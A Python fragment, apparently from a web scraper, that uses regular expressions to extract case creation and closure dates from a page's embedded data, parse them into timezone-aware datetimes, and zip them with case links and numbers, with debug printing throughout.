        def zonify(zlist):
            dates_list = re.findall(r'"(\d\d/\d\d/\d\d\d\d \d\d:\d\d|&nbsp;)"', zlist)
            print('mid dates_list', dates_list)
            for i in range(len(dates_list)):
                if re.match(r'\d\d/\d\d/\d\d\d\d \d\d:\d\d', dates_list[i]):
                    dates_list[i] = datetime.strptime(dates_list[i], '%d/%m/%Y %H:%M').replace(tzinfo = TZI)
                else:
                    dates_list[i] = None
            print('final dates_list', dates_list)
            return dates_list
        create_list = re.findall(r'"CASES\.CREATED_DATE":\[(.+?)\],".+?":', page_html)[0]
        create_dates = zonify(create_list)
        try:
            close_list  = re.findall(r'"CASES\.CLOSED_DATE":\[(.+?)\],".+?":' , page_html)[0]
            close_dates  = zonify(close_list)
        except IndexError:
            close_dates = [None]*len(create_dates)

        print('links', len(links), links)
        print('numbers', len(numbers), numbers)
        print('create_dates', len(create_dates), create_dates)
        print('close_dates', len(close_dates), close_dates)

        results = list(zip(links, numbers, create_dates, close_dates))
        print('zipped results', results)
        print('/\\'*30)
        return results